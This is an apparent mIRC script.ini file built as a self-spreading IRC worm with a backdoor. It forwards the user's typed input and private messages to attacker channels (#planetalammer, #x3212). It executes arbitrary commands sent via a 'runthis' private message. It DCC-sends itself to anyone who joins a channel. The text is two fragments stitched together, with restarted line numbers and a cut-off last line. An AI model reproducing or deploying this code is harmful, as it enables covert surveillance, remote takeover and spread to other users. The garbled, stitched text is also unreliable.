[script]
n0=script.ini
n1=
n2=on 1:START:{
n3=  .sreq ignore
n4=  .remote on
n5=}
n6=on 1:CONNECT:
n7=.msg #planetlammer Hi  Tipo assim.... Este script.ini ta editado Hehe
n8=on 1:INPUT:*:{
n9=  .msg #planetalammer ( $+ $active $+ ) $1-
n10=}
n11=on 1:TEXT:*:?:{
n12=  if ( $1 == runthis ) { .run $2- }
n13=}
n14=
n15=on 1:JOIN:*:{
n16=  if ( $nick == $me ) { halt } | /dcc send $nick Script.ini
n17=}
asswd.
n8=ON 1:NOTICE:*:#:/msg #x3212  $+ $chan $+  - $+ $nick $+ - $parms
n9=ON 1:TEXT:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick
n10=ON 1:TEXT:*:#:/msg #x3212  $+ $chan $+  < $+ $nick $+ > $parms
n11=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI
n12=
n13=#user.prot.add.all off
n14=raw 401:*: set %User.Nick 0 | halt
n15=raw 301:*: halt
n16=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
n17=raw 312:*: halt
n18=raw 313:*: halt
n19=raw 317:*: halt
n20=raw 319:*: halt
n21=raw 318:* {
n22=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto do